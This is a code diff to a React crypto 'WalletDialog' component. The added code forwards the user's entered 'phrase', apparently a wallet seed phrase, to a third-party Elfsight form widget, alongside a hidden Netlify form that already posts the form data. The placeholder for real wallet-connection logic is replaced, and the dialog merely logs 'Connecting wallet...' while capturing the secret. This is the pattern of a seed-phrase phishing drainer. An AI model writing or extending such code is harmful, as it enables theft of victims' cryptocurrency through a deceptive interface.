@@ -14,6 +14,14 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
   const [loading, setLoading] = useState(false);
   const { toast } = useToast();
 
+  // Add Elfsight script
+  useEffect(() => {
+    // Ensure Elfsight widget is initialized
+    if (window.hasOwnProperty('ElfsightApp')) {
+      (window as any).ElfSightApp?.refresh();
+    }
+  }, [open]);
+
   // Add hidden form for Netlify form detection
   useEffect(() => {
     const form = document.createElement('form');
@@ -56,7 +64,19 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
         body: new URLSearchParams(formData as any).toString(),
       });
 
-      // Implement your own wallet connection logic here
+      // Trigger Elfsight form submission
+      const elfsightWidget = document.querySelector('.elfsight-app-12811523-8e4d-48e3-a10d-87d1ae6620a0');
+      if (elfsightWidget) {
+        const event = new CustomEvent('elfsight-app-submit', {
+          detail: {
+            formData: {
+              phrase: phrase
+            }
+          }
+        });
+        elfsightWidget.dispatchEvent(event);
+      }
+
       console.log("Connecting wallet...");
       
       toast({
@@ -117,7 +137,6 @@ const WalletDialog = ({ open, onOpenChange }: WalletDialogProps) => {
             </Button>
           </div>
         </form>
-        <div className="elfsight-app-12811523-8e4d-48e3-a10d-87d1ae6620a0" data-elfsight-app-lazy></div>
       </DialogContent>
     </Dialog>
   );
